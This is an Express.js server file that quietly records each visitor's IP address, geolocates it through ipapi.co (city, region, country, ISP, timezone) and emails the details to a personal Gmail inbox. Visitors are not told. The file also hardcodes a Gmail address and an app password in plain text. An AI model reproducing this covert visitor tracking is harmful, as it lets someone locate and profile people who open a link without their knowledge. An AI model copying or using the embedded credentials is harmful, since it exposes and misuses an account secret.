const express = require('express');
const nodemailer = require('nodemailer');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Hardcoded config
const EMAIL_USER = 'tutelpagebot@gmail.com';
const EMAIL_PASS = 'qwac kvpu orxw vkzu';
const EMAIL_RECEIVER = 'jhonmarkmartinez305@gmail.com';

// Serve HTML from /public
app.use(express.static(path.join(__dirname, 'public')));

// Setup transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: EMAIL_USER,
    pass: EMAIL_PASS
  }
});

// Verify transporter at startup
transporter.verify((err, success) => {
  if (err) {
    console.error('Email transporter error:', err);
  } else {
    console.log('Email transporter is ready');
  }
});

// Send startup email (only once)
let startupEmailSent = false;
async function sendStartupEmail(domainUrl) {
  if (startupEmailSent) return;
  startupEmailSent = true;

  try {
    await transporter.sendMail({
      from: `"Website Monitor" <${EMAIL_USER}>`,
      to: EMAIL_RECEIVER,
      subject: 'Server is UP',
      html: `<h2>Website is live</h2><p>Server is running at <b>${domainUrl}</b></p>`
    });
    console.log('Startup email sent');
  } catch (err) {
    console.error('Error sending startup email:', err.message);
  }
}

// Send visitor email
async function sendVisitorEmail(ip) {
  try {
    if (ip.startsWith('::1') || ip.includes('127.0.0.1')) return;

    const clientIP = ip.includes(',') ? ip.split(',')[0] : ip;
    const { data: location } = await axios.get(`https://ipapi.co/${clientIP}/json/`);

    const html = `
      <h2>New Website Visitor</h2>
      <p><strong>IP Address:</strong> ${clientIP}</p>
      <p><strong>City:</strong> ${location.city}</p>
      <p><strong>Region:</strong> ${location.region}</p>
      <p><strong>Country:</strong> ${location.country_name}</p>
      <p><strong>ISP:</strong> ${location.org}</p>
      <p><strong>Timezone:</strong> ${location.timezone}</p>
    `;

    await transporter.sendMail({
      from: `"Website Visitor" <${EMAIL_USER}>`,
      to: EMAIL_RECEIVER,
      subject: 'New Website Visit Detected',
      html
    });

    console.log(`Visitor email sent for IP: ${clientIP}`);
  } catch (err) {
    console.error('Error sending visitor email:', err.message);
  }
}

// Main route
app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  const domainUrl = `${req.protocol}://${req.headers.host}`;
  sendStartupEmail(domainUrl);
  sendVisitorEmail(ip);
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
